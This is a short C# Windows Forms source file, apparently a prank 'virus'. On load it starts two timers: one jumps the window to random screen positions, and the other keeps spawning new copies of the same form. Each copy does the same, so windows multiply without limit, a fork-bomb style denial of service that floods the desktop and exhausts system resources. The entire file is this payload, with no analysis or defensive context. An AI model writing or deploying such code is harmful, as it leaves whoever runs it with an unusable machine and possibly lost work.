using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace floptropicvm
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            InitializeComponent();
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            timer1.Start();
            timer2.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Random r = new Random();
            int locx = Screen.PrimaryScreen.Bounds.Width;
            int locy = Screen.PrimaryScreen.Bounds.Height;
            this.Location = new Point(r.Next(locx), r.Next(locy));
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            Form2 f2 = new Form2();
            f2.Show();
        }
    }
}
